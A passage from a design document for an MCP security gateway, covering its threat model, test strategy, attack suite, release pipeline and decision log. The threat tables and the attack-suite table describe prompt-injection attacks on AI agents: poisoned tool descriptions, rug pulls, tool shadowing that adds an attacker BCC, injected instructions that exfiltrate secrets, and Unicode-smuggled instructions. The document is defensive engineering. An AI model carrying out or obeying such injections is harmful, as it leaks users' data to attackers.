              "observables": {"canary_exfiltrated": false}, "controls_fired": ["policy:http-allowlist"], "pass": true}]}
```

---

## 7. Security and threat model ✅

Scope: v0.1 (stdio, one upstream per process, no network). Method: data-flow diagram + STRIDE per trust boundary, plus attacker-driven abuse cases. Threats Bulwark **mitigates** (§7.3), threats **to** Bulwark (§7.4–7.5), and **accepted risks** (§7.6) are kept separate.

### 7.1 Assets
| ID | Asset | Why it matters |
|---|---|---|
| A-1 | Data reachable through tools (files, mail, tokens) | The thing attackers want to exfiltrate |
| A-2 | Integrity of what reaches the model (tool definitions, results) | Poisoned context hijacks the agent |
| A-3 | Policy, pin store, and configuration | Tampering silently disables protection |
| A-4 | Audit log | Evidence for investigation; must be trustworthy |
| A-5 | Operator's attention and terminal | Misleading prompts and diffs trick approvals |
| A-6 | Availability of the agent's tools | A gateway that breaks work gets removed |

### 7.2 Trust boundaries

```mermaid
flowchart LR
  C["MCP client<br/>(trusted to follow protocol,<br/>model may be hijacked)"] -- "TB1: stdio pipes" --> B["Bulwark"]
  B -- "TB3: stdio pipes" --> U["Upstream server<br/>(UNTRUSTED code + content)"]
  B -- "TB4: filesystem" --> S[("config, pins,<br/>policies, audit")]
  O(["Operator"]) -- "TB5: CLI" --> B
  U -. "same OS user unless containerized" .-> S
```
| Boundary | Between | Trust assumption |
|---|---|---|
| TB1 | Client ↔ Bulwark | Client process is trusted. **The model driving it may be hijacked**, so its requests are untrusted. |
| TB2 | Inside Bulwark | Trusted code; our own attack surface (parser, pipeline) |
| TB3 | Bulwark ↔ upstream | **Untrusted**: definitions, results, notifications, and server-initiated requests may all be malicious |
| TB4 | Bulwark ↔ local state | Trusted only if the upstream can't write to it (see AR-2) |
| TB5 | Operator ↔ Bulwark | Operator is trusted. Text shown to them comes from untrusted sources |

### 7.3 Threats Bulwark mitigates
| ID | Threat | OWASP Agentic Top 10 (Dec 2025) | OWASP LLM Top 10 (2026) | MITRE ATLAS | v0.1 control | Scenario |
|---|---|---|---|---|---|---|
| M-1 | Tool poisoning in definitions | ASI01 Agent Goal Hijack; ASI04 Agentic Supply Chain Vulnerabilities | LLM01 Prompt Injection | AML.T0051.001 LLM Prompt Injection: Indirect; AML.T0011.002 Poisoned AI Agent Tool | Analyzers + hide in `enforce` (FR-022) | L-01, L-06 |
| M-2 | Rug pull (definition changes after approval) | ASI04 Agentic Supply Chain Vulnerabilities | LLM01 | AML.T0010 AI Supply Chain Compromise; AML.T0011.002 Poisoned AI Agent Tool | Pinning + verify-before-call (FR-021, FR-030) | L-02 |
| M-3 | Tool shadowing (one tool's text steers another's use) | ASI02 Tool Misuse and Exploitation | LLM01 | AML.T0051.001 | Cross-reference analyzer + argument policy (FR-022, FR-024) | L-03 |
| M-4 | Indirect injection through tool results, leading to exfiltration | ASI01 Agent Goal Hijack | LLM01; LLM02 Sensitive Information Disclosure | AML.T0051.001 | Egress allowlist + secret redaction (FR-024, FR-025) | L-04 |
| M-5 | Data exfiltration through tool arguments | ASI02 Tool Misuse and Exploitation | LLM02 | AML.T0086 Exfiltration via AI Agent Tool Invocation | Schema analyzer + argument redaction (FR-022, FR-025) | L-05 |
| M-6 | Over-privileged tool use | ASI03 Identity and Privilege Abuse | LLM03:2026 Excessive Agency | — | Default-deny policy with argument constraints (FR-023, FR-024) | Policy tests |
| M-7 | No record of agent actions | — (supports detection and response for every ASI risk; it mitigates none directly) | — | — | Hash-chained audit (FR-026) | Tamper tests |
| M-8 | Poisoning through server metadata (`instructions`, server info) and other non-tool channels (prompts, resources) | ASI01 Agent Goal Hijack; ASI04 Agentic Supply Chain Vulnerabilities | LLM01 | AML.T0051.001 | Pin, analyze, and strip server metadata in `enforce` (FR-033); analyze and audit prompts and resources (FR-034) | L-07 |
| M-9 | Solicitation and exfiltration through MRTR input requests (the server asks for data; the answer goes back to it) | ASI01 Agent Goal Hijack; ASI09 Human-Agent Trust Exploitation | LLM01; LLM02 | AML.T0051.001 | Retries on all three MRTR methods checked: secret scan of `inputResponses`, unsolicited and unmatched answers blocked; `tools/call` retries also policy-evaluated (FR-035); input requests analyzed (FR-034) | L-08 |

> **Sources, checked 2026-11-26:** OWASP Agentic Top 10 IDs and titles from the OWASP GenAI Security Project's own corpus repository (manifest entry for the 2026 final document: ASI01 Agent Goal Hijack … ASI09 Human-Agent Trust Exploitation, ASI10 Rogue Agents). OWASP LLM Top 10 2026 IDs from the project's GitHub repository (LLM01:2026 Prompt Injection, LLM02:2026 Sensitive Information Disclosure, LLM03:2026 Excessive Agency). MITRE ATLAS IDs from the official ATLAS data (v5.6.0): AML.T0010 AI Supply Chain Compromise, AML.T0011.002 Poisoned AI Agent Tool, AML.T0051.001 Indirect, AML.T0086 Exfiltration via AI Agent Tool Invocation. Tool poisoning is mapped to both the indirect prompt-injection sub-technique, because tool metadata is content the model ingests, and the poisoned-agent-tool technique.

### 7.4 Threats to Bulwark (STRIDE)
| ID | Boundary | STRIDE | Threat | Mitigation | Requirement | Residual |
|---|---|---|---|---|---|---|
| T-01 | TB3 | Tampering | **Parser differential:** a message with duplicate JSON keys (`"description"` twice) is read one way by Bulwark and another way by the client, so the analyzers inspect harmless text while the model sees the poison | Reject duplicate keys and invalid UTF-8; **forward the re-serialized form Bulwark inspected**, never the original bytes | FR-028 | Low |
| T-02 | TB3 | Tampering | Unicode tricks (homoglyphs, zero-width characters, Tag-block characters, bidi controls) hide instructions from pattern matching | Analyzers inspect both raw and NFKC-normalized text; `unicode.hidden` flags invisible characters | FR-022 | Medium (new encodings) |
| T-03 | TB3 | DoS | Oversized, deeply nested, or flooding messages (including notification storms) exhaust memory or CPU | Size and depth limits, bounded queues, rate limits on notifications; violations error out and are audited | NFR-013 | Low |
| T-04 | TB3 | Spoofing | **Response ID confusion:** upstream answers with the ID of another outstanding request, or with the ID of a gateway-originated request (`server/discover`, re-check `tools/list`), to confuse the client | Outstanding-request tracking (client-to-server always; server-to-client too under 2025-11-25); gateway-originated requests use a reserved ID namespace and are never forwarded; unmatched responses are dropped and audited | FR-031 | Low |
| T-05 | TB3 | Tampering | **2025-11-25 only:** server-initiated requests (sampling, elicitation, roots) used to inject content or extract data | v0.1: passed through, **audited**, and flagged in `audit tail`; enforcement planned for v0.2. Under 2026-07-28 the same capability arrives as MRTR and is covered by T-16 | FR-026 | Medium (accepted for v0.1) |
| T-06 | TB3 | Tampering | **Behavioral rug pull:** definition stays the same but the tool's behavior changes | Out of scope for pinning (definitions only); argument policy and result redaction limit impact | FR-024, FR-025 | Medium (AR-4) |
| T-07 | TB3 | Evasion | Payloads crafted to slip past analyzers (paraphrase, splitting across fields, base64) | Layered defense: pinning and policy don't depend on detection; adversarial corpus grows with each bypass | FR-006, FR-022 | Medium (AR-5) |
| T-08 | TB4 | Tampering | Pins, policies, or config modified to approve a malicious tool | File permission checks at startup (warn if group- or world-writable); every pin change is audited; container wrapping keeps the upstream away from the files | FR-026 | **High without container** (AR-2) |
| T-09 | TB4 | Repudiation | Audit records edited or deleted | SHA-256 hash chain; `audit verify`. Full chain rewrite or tail truncation is detectable only with an external anchor (v0.2 signed checkpoints) | FR-026, NFR-006 | Medium (AR-6) |
| T-10 | TB4 | Info disclosure | Secrets written into the audit log | Redact before logging; store keyed argument MACs (HMAC-SHA-256, per-install key) rather than raw values or plain hashes by default | FR-025, FR-026 | Low |
| T-11 | TB5 | Spoofing | **Terminal escape injection:** tool text containing ANSI escapes or bidi controls makes a diff or approval prompt show something other than the truth | All untrusted text printed by the CLI goes through `termsafe` (escapes rendered visibly) | FR-029 | Low |
| T-12 | TB5 | Spoofing | Approval prompt hijack: prompts read from stdin, which carries MCP traffic; or, in a terminal-based agent, a prompt on the shared terminal corrupts the agent's interface and races it for keystrokes | v0.1 has **no interactive prompts**: `ask` = deny with an `approval_required` audit record; approval happens out of band through the CLI. (GUI clients launch servers with no terminal at all, so a terminal prompt could not work there anyway.) | FR-023 | Low |
| T-13 | TB1 | Elevation | **Bypass:** the agent is configured to launch the server directly, not through Bulwark | Documented; `bulwark doctor` (later) checks known client configs | — | Medium (AR-3) |
| T-14 | TB2 | Tampering | Supply-chain compromise of Bulwark or its dependencies | Pinned `go.sum`, `govulncheck` and dependency review in CI, SBOM, signed releases | NFR-012, NFR-015 | Low |
| T-15 | TB2 | DoS | Policy engine error or panic leaves calls unchecked | Fail closed (NFR-005); panics in interceptors are recovered and become denials | NFR-005 | Low |
| T-16 | TB3 | Info disclosure | **MRTR solicitation:** an `input_required` result asks the user or model for a secret or file contents, and the retried call carries the answer back to the server, bypassing checks that only look at ordinary arguments | Retries of `tools/call`, `prompts/get`, and `resources/read` are matched and checked before policy: secret scan of `inputResponses`, unsolicited and unmatched checks; `tools/call` retries also get the pin check and policy (FR-035); input-request text analyzed and audited (FR-034) | FR-034, FR-035 | Medium (non-secret-shaped data still passes if policy allows the call) |
| T-17 | TB1/TB3 | Evasion | **Revision confusion:** a message in an older, unknown, or mixed revision is shaped so that Bulwark's interceptors miss it (for example server metadata arriving through `initialize` when Bulwark expects `server/discover`, or a change notification in the other revision's form) | Per-message revision detection; both supported revisions map onto one internal model so every control applies to both; unsupported revisions rejected in `enforce`; compatibility subset of the suite runs under 2025-11-25; under 2026-07-28, server-originated requests and `input_required` on non-MRTR methods are treated as violations | FR-036 | Low |
| T-18 | TB3 | Evasion | **Pin evasion through unhashed fields:** a server changes or poisons a tool field that the fingerprint does not cover (`icons`, `_meta`, a field from a newer revision) | Whole-object fingerprint with an explicit, audited exclude list (empty by default); unknown fields are kept and hashed, never dropped | FR-021, FR-028 | Low |
| T-19 | TB4 | Info disclosure | **Policy as an exfiltration path:** a policy file (malicious, or copied carelessly) uses OPA network or runtime built-ins such as `http.send` to send decision inputs, which include arguments, to a remote host, or reads the environment | Policies compiled with an OPA capabilities set that removes network and runtime built-ins; loading a policy that uses them fails (ADR-0004) | NFR-014 | Low |

### 7.5 Attack suite threats
| ID | Threat | Mitigation | Requirement |
|---|---|---|---|
| T-L1 | Lab server touches the network or real files | No network code in lab servers; suite runs in a network-disabled job; all writes confined to a temp directory | FR-002, NFR-003 |
| T-L2 | Someone configures a lab server in a real agent by mistake | `bulwark-lab` refuses to start without `BULWARK_LAB=1`; `LAB ONLY` banner on stderr; tool descriptions carry a visible lab marker outside the attack payload | FR-008 |
| T-L3 | Lab code is reused as an attack toolkit | Only publicly documented techniques; canaries only; no evasion tuning against real products | Hard rule 4 |

### 7.6 Accepted risks (stated in the README's "Limitations" section)
| ID | Risk | Why accepted | Guidance |
|---|---|---|---|
| AR-1 | A malicious stdio server is local code running as the user. It can read files or use the network **directly**, without going through MCP | Bulwark controls the agent-mediated channel; it isn't a sandbox | Run untrusted servers in a container: `bulwark wrap -- docker run -i --rm --network none <image>` |
| AR-2 | The same server can modify Bulwark's state files (T-08) | Same as AR-1 | Container wrapping; store state outside any directory mounted into the container |
| AR-3 | Bypass through misconfiguration (T-13) | Local tool; can't control the client | Documentation; `doctor` check later |
| AR-4 | Tool behavior isn't pinned, only definitions (T-06) | Behavior can't be fingerprinted from the protocol | Argument policy, redaction; taint tracking in v0.2 |
| AR-5 | Analyzers can be evaded (T-07) | Detection is never complete | Pinning and policy work regardless of detection |
| AR-6 | The audit chain can be rewritten wholesale by someone with write access (T-09) | Needs an external anchor | Signed checkpoints in v0.2 |
| AR-7 | Prompt injection itself isn't prevented | NG1: Bulwark limits damage | — |
| AR-8 | Prompts, resources, and MRTR input requests are **analyzed and audited but not pinned or blocked** in v0.1 (CH-4…CH-6) | Keeps v0.1 small; tool definitions and server metadata are the channels the model sees on every session | Review findings with `audit tail`; pinning and blocking for these channels in v0.2 |
| AR-9 | Injected instructions inside tool results, resource contents, error messages, or notifications are **not detected** in v0.1 (CH-3, CH-5, CH-8, CH-9); only secrets are redacted | Detecting injection in arbitrary content needs the classifier tier (v0.3); detection is never complete (AR-5) | Egress policy and redaction limit what a hijacked agent can send (M-4); taint tracking in v0.2 |
| AR-10 | **Path checks are lexical.** `fs_path` is cleaned as a string; Bulwark cannot see the server's filesystem, so symlinks, case-insensitive filesystems (default on macOS), Unicode-normalizing filesystems, and container mounts can make a path that passes the check resolve somewhere else | Resolving paths requires the server's view of the filesystem, which a gateway does not have | Run file servers in a container that mounts only the workspace; treat path rules as defense in depth, not containment |
| AR-11 | **Exfiltration through allowed destinations.** An egress allowlist cannot stop data sent to an allowed host that accepts user content (an issue tracker, a paste service, a shared document), or encoded in allowed arguments (paths, query strings, file names) | Policy constrains where data goes, not what it means | Keep allowlists narrow; secret redaction (FR-025) catches secret-shaped data; taint tracking in v0.2 blocks egress after sensitive reads |

### 7.7 Security requirements derived from this model
These were added to §2 in v0.6: **FR-028** (strict parsing, forward what was inspected), **FR-029** (terminal-safe output), **FR-030** (verify before call), **FR-031** (request ID isolation), **FR-008** (lab binary guard; first drafted as FR-032 and renumbered in v0.8 to fit the suite ID range), **NFR-013** (resource limits), **NFR-014** (no network listeners or connections), **NFR-015** (dependency hygiene). Added in v0.7 from the design 02 review: **FR-033** (server metadata pinning), **FR-034** (analysis of prompts, resources, and MRTR input requests), **FR-035** (MRTR retries as full calls), **FR-036** (revision handling); FR-003, FR-021, FR-025, and FR-031 amended.

## 8. AI/ML design 📝 (v0.3; v0.1 uses no AI model, and the interface hook is in §5.10)

- **Where AI will be used:** only to *score* text (tool descriptions, results) for injection likelihood. All enforcement stays deterministic policy, so the security boundary never depends on a model behaving correctly.
- **Planned tiers:** tier 0 rules (the v0.1 analyzers) → tier 1 a small local classifier on CPU, runnable in CI (FR-044) → no LLM-as-judge (privacy and NFR-007).
- **Evaluation:** the v0.1 corpora (§5.4) plus the suite with the classifier enabled; precision, recall, false-positive rate, and latency per tier.
- **Failure modes:** false negatives (taint containment in v0.2 limits impact), false positives (`warn` mode and thresholds), drift (refresh the corpus each release). If the classifier is unavailable, tier 0 and policy continue.
- **Deferred to the v0.3 design (not v0.1 gate items):** which open classifier model to use and its license, which public prompt-injection datasets to use and their licenses, and whether to fine-tune.

---

## 9. Observability and operations ✅

v0.1 has **no metrics endpoint**, because it opens no listeners (NFR-014). The audit log is the observability surface.

| Need | v0.1 mechanism |
|---|---|
| What happened, and why | Audit log (§5.8); `bulwark audit tail --event call_decision --follow` |
| Integrity | `bulwark audit verify` (exit code 3 on a broken chain) |
| Operational logs | stderr: `log/slog`, text by default, `--log-format json` optional. Never contains raw argument values. The upstream's stderr is passed through unchanged |
| Session summary | On exit, one stderr line with counts (calls allowed and denied, findings by severity, hidden tools) |
| Pending approvals | `bulwark tools list` shows `pending` and `changed` tools with their findings |
| Metrics and traces | v0.3 (FR-045): OTel and OCSF export from the audit stream |

**Operational rules:**
- **State permissions:** `state_dir` is created `0700` and files `0600`. At startup, Bulwark warns if any are group- or world-writable (T-08), and in `enforce` mode refuses to start.
- **Audit write failure** (disk full, permissions) in `enforce` mode: every call is denied and one `audit_error` line goes to stderr. Nothing proceeds unrecorded.
- **Configuration and policies** load once at start. A change takes effect the next time the client starts the server, so there is no hot reload or reload race in v0.1.
- **Upgrades:** the pin store and audit records carry version fields (`schema_version`, `v`). A newer Bulwark migrates the pin store forward atomically and keeps a backup. It never rewrites audit files.

## 10. Testing and evaluation strategy ✅

### 10.1 Test pyramid
| Layer | What | Examples |
|---|---|---|
| Unit | Pure functions, table-driven | Parser edge cases, canonical form, fingerprints, each analyzer rule (positive and negative), secret rules, derived attributes, decision combiner |
| Property and fuzz | Go native fuzzing | Parse → serialize → parse identity (FR-028); framing never splits or merges messages; the analyzers never panic. A 60 s fuzz run on every PR, 10 min nightly |
| Policy | `opa test` through `bulwark policy test` | Each restriction blocks **with the baseline allow enabled** and reports its rule ID; a missing derived value denies; a policy using a removed built-in (for example `http.send`) fails to load |
| Integration | Real processes over pipes | Bulwark between the official Go SDK client and lab servers; error-format test (§6.6); revision detection (§5.2) |
| End-to-end (suite) | Replay client → Bulwark → lab servers | 8 scenarios × 3 conditions × controls × revisions (§10.3) |
| Corpus | Analyzer detection and false-positive rates | MCPTox subset and benign reference-server tools (§5.4) |
| Benchmark | Go benchmark over recorded messages | NFR-004 gate |

**Determinism rules (NFR-008):** an injected clock, fixed seeds in test mode, no real network, temp directories per test, and no ordering dependence between tests. The suite runs twice per CI run and the two `results.json` files must be identical.

### 10.2 CI workflows and NFR verification
| Workflow | Trigger | Jobs | Verifies |
|---|---|---|---|
| `ci.yml` | Every PR and push | Lint (`go vet`, `staticcheck`, `gofmt`); unit, property, and policy tests; 60 s fuzz; integration tests; benchmark gate; import check (no `net` in Bulwark's own packages) | FR-020…FR-036, NFR-004, NFR-005, NFR-006, NFR-013, NFR-014 |
| `suite.yml` | Every PR and push | Build both binaries; run the suite twice in a container with networking disabled, under a syscall trace (`strace -f -e trace=%network`); fail on any non-loopback `connect`; compare the two results; publish the results table to the job summary | FR-001…FR-008, NFR-003, NFR-007, NFR-008 |
| `security.yml` | Every PR; weekly | `govulncheck`; GitHub dependency review (free for public repos); `gitleaks` CLI secret scan of the repo (MIT), in addition to GitHub secret scanning with push protection, enabled in repository settings | NFR-015 |
| `macos.yml` | Every PR and push | `ci.yml` and `suite.yml` jobs on macOS, in parallel with Linux (no `strace`; network isolation is checked on Linux only) | NFR-010 |
| `meta` job in `ci.yml` | Every PR | `actionlint` on all workflows; a check that every job uses a standard GitHub-hosted runner label (no paid larger runners) and no paid third-party service; a check that **every MVP requirement ID appears in a test**, either in the test name or in a `// Verifies: FR-xxx` comment tag on a test (documents don't count) | NFR-001, NFR-002 |
| `nightly.yml` | Nightly | 10 min fuzz per target; corpus report | FR-006, FR-028 |
| `release.yml` | Version tag | Build, SBOM, sign, attest, scripted quickstart from the release archive | FR-007, NFR-011, NFR-012 |

**Time budget (C-4):** the repository is public, so standard GitHub-hosted runners cost nothing and there is no minute allowance to manage. The only budget is wall time: each workflow runs in parallel and must finish within 10 minutes (NFR-009). macOS runners are slower than Linux, so `macos.yml` runs the suite once rather than twice, and the double-run determinism check (NFR-008) stays on Linux.

### 10.3 Attack suite
The attack scenarios are built **first** (M1, see §12). Each one starts as a test that the attack succeeds, and each Gateway feature is finished when its scenario is detected under `warn` and blocked under `enforce`, by the control the manifest names.

`lab/` contains deliberately malicious, **harmless** MCP servers. "Exfiltration" goes to the observation log file (§4.2) and "secrets" are fake canaries. Every scenario works with a single upstream server, matching v0.1 scope. All scenarios run under revision 2026-07-28; L-01, L-02, and L-07 also run under 2025-11-25 to cover the compatibility path (FR-036).

| Scenario | Attack (replayed) | Observables under `none` | Blocked in v0.1 by (one control per run) | Later control |
|---|---|---|---|---|
| L-01 Poisoned description | Hidden `<IMPORTANT>` instruction to read a canary file and pass it to another tool | `poison_delivered`, `canary_exfiltrated` | Analyzer finding → tool hidden (FR-022); path policy (FR-024) | Classifier (v0.3) |
| L-02 Rug pull | Tool definition changes after the N-th call | `poison_delivered` after change | Pin mismatch → quarantine (FR-021) | — |
| L-03 Shadowing | One tool's description tells the agent to BCC an attacker address whenever it uses the server's `send_email` tool | `poison_delivered`, `forbidden_call_executed` | Cross-reference analyzer (FR-022); recipient-domain policy (FR-024) | Cross-server shadowing with aggregation (v0.2) |
| L-04 Indirect injection | A tool result contains instructions to send a canary to an external URL | `canary_exfiltrated` | Egress domain allowlist (FR-024); secret detection in arguments, blocked by the secrets interceptor (FR-025) | Taint tracking (v0.2) |
| L-05 Argument side channel | Schema adds a free-text `context` parameter that solicits secrets | `canary_exfiltrated` | Side-channel schema analyzer (FR-022); secret detection in arguments (FR-025) | — |
| L-06 Unicode smuggling | Unicode Tag-block characters encode hidden instructions | `poison_delivered` | `unicode.hidden` analyzer (FR-022) | — |
| L-07 Poisoned server instructions | Server `instructions` (from `server/discover`, or `initialize` under 2025-11-25) tell the agent to read a canary file and send it out; tool definitions are clean | `poison_delivered` | Metadata analyzer finding → instructions stripped (FR-033) | Prompt and resource pinning (v0.2) |
| L-08 MRTR solicitation | A tool answers with `input_required`, asking for "your API key to continue"; the scripted retry supplies a canary in `inputResponses` | `canary_exfiltrated` | Secret scan of `inputResponses` + policy on the retry (FR-035); input-request finding (FR-034) | Approval broker (v0.2) |

**Attribution, so a test cannot pass for the wrong reason (FR-004):** each "Blocked in v0.1 by" entry above is a separate control. Where a row lists two, the scenario runs once per control with only that control enabled. Canaries come in two shapes: **secret-shaped** (`AKIAEXAMPLE…`, matched by the secret rules) and **plain** (`canary-plain-…`, a value a unit test proves no secret rule matches). For example, L-04 uses a plain canary to prove the egress allowlist, and a secret-shaped canary sent to an *allowed* host to prove secret detection. The CI results table shows which control fired.

**Replay, not live agents:** each scenario runs with the replay client under `none`, `bulwark-warn`, and `bulwark-enforce`, and asserts the expected observables (FR-004). The suite runs on every PR (FR-005). Optional live-model runs are a later feature (FR-046). Public projects are used as **sources of attack patterns only**: the "Damn Vulnerable MCP Server" repositories found on GitHub carry no license, so no code or text is copied from them. MCPTox data is reused under CC BY 4.0 (§5.4). MCP-SafetyBench is cited for multi-turn scenarios in v0.2.

---

## 11. Deployment and packaging ✅

**Distribution (v0.1):** a single static binary (`CGO_ENABLED=0`), built for linux/amd64, linux/arm64, darwin/amd64, and darwin/arm64. Windows/amd64 is built but not tested in CI (NFR-010).

| Release asset | Contents | For |
|---|---|---|
| `bulwark_<version>_<os>_<arch>.tar.gz` | `bulwark` only | Users |
| `bulwark-demo_<version>_<os>_<arch>.tar.gz` | `bulwark`, `bulwark-lab`, scenario manifests, a `demo.sh` that runs the results table, and a README with the `LAB ONLY` warning | Reviewers (FR-007, NFR-011) |
| `checksums.txt`, SBOM (SPDX JSON, one per archive), signatures | Verification | Everyone |

The lab binary is never in the user archive, so installing Bulwark can't install attack servers (T-L2). `make demo` runs the same demo from a clone for people with Go installed. A demo container image is optional and is item 2 on the cut line (§12.1).

**Build and release pipeline (`release.yml`):**
1. Tag `vX.Y.Z` → GoReleaser (MIT-licensed) builds reproducibly (`-trimpath`, fixed `ldflags`, `SOURCE_DATE_EPOCH` from the commit).
2. SBOM per archive (Syft, SPDX JSON).
3. Keyless signing of the checksums file with Sigstore cosign, using the workflow's GitHub OIDC identity.
4. Build provenance with GitHub artifact attestations.
5. A scripted quickstart downloads the just-built demo archive, verifies its signature, runs `demo.sh`, and compares the results table with the suite (NFR-011).

**Signing and provenance are available now that the repo is public.** GitHub artifact attestations on Free/Pro/Team plans work only for public repositories (GitHub docs), and keyless signing records the repository identity in Sigstore's public transparency log, which is appropriate for a public project. The first signed release is v0.1 at M3 (decision 30). Until then, CI builds the archives as unsigned workflow artifacts on every merge.

**Install paths documented in the README:** download and verify (`cosign verify-blob` and `gh attestation verify` commands), or `go install github.com/1337-llama/robust-mcp-bulwark/cmd/bulwark@vX.Y.Z`. A Homebrew tap is later.

**Versioning:** SemVer. During 0.x, the CLI, configuration (`version: 1`), pin store (`schema_version`), and audit record (`v`) may change, but every change comes with a migration or a clear error, never silent breakage.

## 12. Milestones and roadmap ✅
| Milestone | Scope | Exit criteria |
|---|---|---|
| M0 | Design approved | Design review checklist passed |
| M1 | **Attack suite + transparent stdio proxy (both revisions) + audit log** | L-01…L-08 run in CI under all conditions; attacks succeed under `none` and (as expected at this stage) also through the passthrough proxy; network-isolation test passes; audit chain verifies |
| M2 | Pinning (tools and server metadata) + static analyzers on all channels + CLI + detection corpora | L-01, L-02, L-03, L-06, L-07 detected under `warn` and blocked under `enforce`, with the expected control attributed; detection rate and false-positive rate reported in CI |
| M3 | Policy engine + argument constraints + secret redaction + MRTR retry checks + demo + release pipeline; **v0.1 release** | All eight scenarios detected under `warn` and blocked under `enforce`, each control attributed; NFR-004 met; signed release with SBOM; one-command demo; launch write-up drafted for the maintainer to publish |
| M4 | Streamable HTTP + multi-server aggregation + taint tracking + approval broker; **v0.2** | New scenarios for HTTP and taint pass |
| M5 | Classifier tier (CPU, in CI) + OTel/OCSF export + optional live-model mode; **v0.3** | Classifier corpus results in CI |

### 12.1 Delivery estimate and cut line
The review budget is about one 30-minute PR per week (C-2). Each spec is one spec PR plus two or three code PRs, so the 8 v0.1 specs need about 24–32 review slots: **roughly 6–8 months to v0.1**. Already cut from v0.1 to fit: interactive `ask` prompts (FR-023), entropy-based secret detection (FR-025), and a separate audit spec (merged into spec 002). If the project falls behind, cut next, in this order:

1. macOS CI on every PR (moves to merges and releases only if it pushes PR wall time past NFR-009)
2. The container form of the demo (FR-007 keeps `make demo` with the release binary)
3. Analysis of resource contents and prompts (FR-034 narrows to MRTR input requests; AR-8 widens)
4. The 2025-11-25 compatibility subset (FR-036 keeps rejecting unsupported revisions; the compatibility path moves to v0.2)

Nothing that backs a README claim is on this list: each cut removes a claim along with the work.

**Why attacks first:** every protection starts as a failing attack test and is finished when that test passes. This is test-driven development applied to security, and it means the README's claims are all backed by CI ([ADR-0001](docs/adr/0001-lab-first-roadmap.md), amended by [ADR-0002](docs/adr/0002-gateway-with-attack-suite.md)).

## 13. Alternatives considered
| Decision | Chosen | Alternatives | Where |
|---|---|---|---|
| Positioning | Gateway + deterministic attack suite | Live-model benchmark; gateway only; benchmark only | [ADR-0002](docs/adr/0002-gateway-with-attack-suite.md) |
| Language | Go | Python, TypeScript, Rust | [ADR-0003](docs/adr/0003-implementation-language.md) |
| Policy engine | OPA/Rego with a default-deny combiner | Cedar, custom YAML, Go plugins | [ADR-0004](docs/adr/0004-policy-engine.md) |
| Deployment shape (v0.1) | One process per wrapped server | Aggregating gateway (v0.2) | §4, decision 9 |
| Lab sink | Observation log file | Loopback HTTP listener (needs networking in tests) | §4.2, decision 10 |
| Rug-pull re-check | Gateway-initiated `tools/list` when stale (notification, `ttlMs`, max age); every call opt-in | Every call by default (doubles upstream traffic, disturbs stateful servers, little extra protection); notifications only (misses servers that never notify) | §4.4, decision 11 |
| Forwarding | Re-serialize the inspected message | Forward original bytes (parser-differential risk, T-01) | §7.4, decision 12 |
| Protocol revisions | 2026-07-28 primary + 2025-11-25 compatibility, revision-aware, no translation | 2026-07-28 only (breaks with clients and servers still on 2025-11-25); 2025-11-25 only (outdated at launch); translating between revisions (large, error-prone surface) | §1.3, decision 14 |
| Fingerprint scope | Whole object with an explicit exclude list | Fixed include list of fields (new or overlooked fields bypass pinning, T-18) | §5.1, decision 15 |
| Non-tool channels | Pin + strip server metadata; analyze and audit prompts, resources, MRTR requests | Tool definitions only (leaves `instructions` open, B2); pin and block every channel in v0.1 (too large for the MVP) | §4.5, decision 16 |
| Policy subject | Server identity + pin status + configured argument roles | Tool name and argument names alone (server-controlled, S2 in the design 02 review) | §5.3, decision 18 |
| `ask` in v0.1 | Deny with an `approval_required` audit record | `/dev/tty` prompt (unusable in GUI clients, conflicts with terminal agents) | §7.4 T-12, decision 19 |
| Suite assertions | Observables + attributed control, one run per control | Observables only (a test can pass because a different control fired) | §10.3, decision 20 |
| MRTR retries | New `tools/call` through the full pipeline | Treat as continuation of an already-approved call (answers bypass policy, T-16) | §4.4, decision 17 |
| First-run policy | Embedded baseline allow for approved tools; secret and MRTR blocks are gateway checks that apply regardless of policy | Pure default-deny (blocks everything until Rego is written); allow-all until configured (no protection) | §5.6, decision 25 |
| How operators restrict calls | `deny` rules (always win; named in results) | `allow` rules combined with a baseline allow (the baseline allow overrides them, review B1) | §5.6, decision 35 |
| Server identity | Operator ID + command digest | Server-reported `serverInfo` (spoofable); hash of every loaded file (not visible to a stdio gateway) | §5.3, decision 26 |
| Replay client | Raw scripted JSON-RPC | Official SDK client (can't send malformed or mixed-revision messages; would need a version pin) | §5.9, decision 29 |
| Secrets in requests | Deny via policy | Redact silently (changes what the tool does); audit only (data leaves) | §5.5, decision 31 |

## 14. Decision log and open questions

### 14.1 Decision log
| # | Decision | Rationale | ADR | Date |
|---|---|---|---|---|
| 1 | Attacks first: attack scenarios are built before the features that block them | Test-driven security; every claim backed by CI | [ADR-0001](docs/adr/0001-lab-first-roadmap.md) (amended) | 2026-11-26 |
| 2 | Gateway with a deterministic attack suite; no live-model benchmark in v0.1 | Portfolio purpose, $0 budget, and no maintainer time for experiments; evidence differentiates in a crowded field | [ADR-0002](docs/adr/0002-gateway-with-attack-suite.md) | 2026-11-26 |
| 3 | v0.1 Gateway is stdio-only with one upstream server | Cuts the MVP to a size one person can deliver; covers the local-developer use case | — | 2026-11-26 |
| 4 | $0 budget and fully automated testing: OSS dependencies, GitHub Free, all verification in CI | Maintainer constraints | — | 2026-11-26 |
| 5 | Use MCPTox poisoned tool definitions as analyzer test data (license permitting) | Deterministic detection metric comparable with published research | — | 2026-11-26 |
| 6 | Sampling/elicitation passed through and audited, not enforced, in v0.1. *Amended v0.7:* applies to 2025-11-25 server-initiated requests; under 2026-07-28 these arrive as MRTR and the retry is checked (decision 17) | Keeps the MVP small; still visible in audit logs | — | 2026-11-26 |
| 7 | Working agreement: Claude drafts with recommendations applied; maintainer reviews by PR | Maintainer has 1–2 h/week | — | 2026-11-26 |
| 8 | Go for gateway, lab, and suite; MCP baseline 2026-07-28 | Single-binary releases, native OPA, stable official SDK | [ADR-0003](docs/adr/0003-implementation-language.md) | 2026-11-26 |
| 9 | One gateway process per wrapped server in v0.1 | Simplest model; matches how MCP clients launch stdio servers | — | 2026-11-26 |
| 10 | Lab sink is an observation log file, not a network listener | Lets the suite run with networking fully disabled | — | 2026-11-26 |
| 11 | Verify-before-call in `enforce` mode. *Amended v0.8:* re-check when stale (change notification, `ttlMs`, or `pin_recheck_max_age`, default 300 s); every call is opt-in | Definitions reaching the model are already checked on every `tools/list`; the re-check only signals an implementation change, and a malicious server can defeat it (T-06), so it is not worth an extra round trip on every call | — | 2026-11-26 |
| 12 | Forward re-serialized inspected messages; reject duplicate keys | Closes parser-differential bypasses (T-01) | — | 2026-11-26 |
